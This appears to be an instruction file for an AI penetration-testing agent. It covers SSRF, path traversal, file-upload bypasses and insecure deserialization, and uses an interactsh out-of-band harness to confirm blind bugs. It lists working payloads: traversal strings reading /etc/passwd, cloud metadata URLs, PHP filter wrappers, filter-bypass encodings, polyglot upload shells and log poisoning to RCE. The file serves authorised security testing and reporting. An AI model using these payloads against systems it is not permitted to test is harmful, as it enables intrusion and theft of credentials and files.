---
name: server-side-ssrf-lfi
description: Server-side attacks — SSRF, LFI/path-traversal, file-upload, insecure deserialization — plus the OOB (interactsh) blind-confirmation harness used across all blind classes. Use when params take URLs/filenames/paths, when files are uploaded, or to confirm any blind vuln (SSRF/RFI/blind SQLi/RCE/XXE) via out-of-band callback. OWASP A10/A01/A08, CWE-918/22/98/434/502.
---

# SSRF / LFI-Path-Traversal / Upload / Deserialization + OOB

`dr(){ docker run --rm detech/toolbox:latest "$@"; }`

## OOB harness (interactsh) — the blind-class confirmer (use everywhere)
A blind vuln is only **confirmed** by an out-of-band callback. Run one interactsh session,
inject **unique per-test subdomains**, wait, correlate hits back to the injection point.
```bash
# 1) get a domain
DOM=$(dr interactsh-client -json 2>/dev/null | grep -aoE "[a-z0-9]+\.oast\.[a-z]+" | head -1)
# 2) inject http://<label>.$DOM into the sink (param/header/XML/cmd), where <label> encodes the test
# 3) keep the client running while injecting, then read interactions; a DNS/HTTP hit whose
#    full-id contains <label> = CONFIRMED. (Match case-insensitively — interactsh 0x20-encodes DNS.)
```
Prefer a `python3 -c` orchestrator (subprocess interactsh-client + `urllib` injections +
correlation), as built in the platform. No callback → keep as "potential", never "confirmed".

## SSRF (Server-Side Request Forgery)
Sinks: params like `url,uri,link,callback,webhook,image,imageUrl,file,feed,host,dest,proxy,
next,to` and headers `X-Forwarded-Host, Referer, X-Forwarded-For, True-Client-IP, X-Original-URL`.
- **OOB confirm:** set the value to `http://<label>.$DOM/`; a callback = confirmed SSRF.
- **Internal reach / impact:** `http://127.0.0.1:<port>/`, `http://localhost/admin`,
  cloud metadata `http://169.254.169.254/latest/meta-data/` (AWS),
  `http://metadata.google.internal/computeMetadata/v1/` (GCP, header `Metadata-Flavor:Google`).
- **Filter bypass:** alternate IP encodings (decimal/octal/hex), `[::]`, `0`, `127.0.0.1.nip.io`,
  `@`-tricks (`http://expected@attacker`), open-redirect chaining, DNS rebinding, scheme abuse
  (`gopher://`, `file://`, `dict://`).

## LFI / Path traversal
Sinks: `file,path,page,template,include,download,doc,view`.
- Payloads: `../../../../../../etc/passwd`, `....//....//etc/passwd`,
  `..%2f..%2f..%2fetc%2fpasswd`, `%252e%252e%252f` (double), null byte `%00`, `/etc/passwd`,
  Windows `..\..\windows\win.ini`.
- **Confirm:** `root:.*:0:0:` (passwd) or `[fonts]/[extensions]` (win.ini) in the response,
  **absent from a benign baseline**.
- **Escalate:** PHP wrappers `php://filter/convert.base64-encode/resource=index.php` (source
  disclosure), `/proc/self/environ`, log poisoning → RCE; **RFI** if remote includes allowed
  (`http://<label>.$DOM/x.txt` → OOB callback confirms).

## File upload
- Bypass type checks: double ext (`shell.php.jpg`), null byte, `Content-Type` spoof, magic-byte
  prefix, `.phtml/.phar/.svg/.htaccess`, case (`.pHp`). Path-traversal in filename.
- If an uploaded script is reachable & executed → RCE (prove with `id`, non-destructive).
- SVG/XML upload → XXE (`injection-ssti-xxe`). Image parsers → ImageTragick/exiftool CVEs.
- **Laravel `image` rule bypass:** the framework `image` validation calls `getimagesize`, so
  fake-image (php/svg/html content named `.png`) is rejected — you need a **polyglot**: a *real*
  valid image (a minimal valid PNG/JPEG) with the payload appended, given a dangerous extension.
  Test whether the real-image-content + `.php`/`.phtml` name passes, and where it's stored
  (direct webroot path = potential RCE; DB-backed `/media/{id}` signed URL = usually inert).
- **Detect a filename blocklist via error differential:** upload the *same valid image* under many
  names; if names containing certain tokens (`php`, `.php.`, case variants) return **500** while
  benign names return **200**, the server has a filename filter whose handling is buggy — an
  unhandled-exception finding that also reveals the blocklist to refine bypass attempts.
- Check stored-file access control (signed vs guessable path), and whether upload triggers
  server-side processing (thumbnail/convert) → ImageTragick/Ghostscript/SSRF via `<img src=file://>`.

## Insecure deserialization
Identify serialized blobs (Java `rO0AB`, PHP `O:`, .NET, Python pickle, Ruby Marshal, Node
`node-serialize`). Tamper safely to detect handling; demonstrate impact via OOB callback rather
than dropping a real RCE chain. Note the sink + library+version for the report.

## Analysis & recording
Record sink, payload, **callback proof or file marker**, exact request+response, CWE (918/22/
98/434/502), OWASP (A10 SSRF / A01 traversal / A08 deserialization), CVSS, impact (internal
access, cloud creds, RCE, file disclosure), remediation (allow-list hosts/paths, block
internal ranges & link-local, disable remote includes, validate uploads out of webroot, safe
deserialization). Pass `validation-gates`.
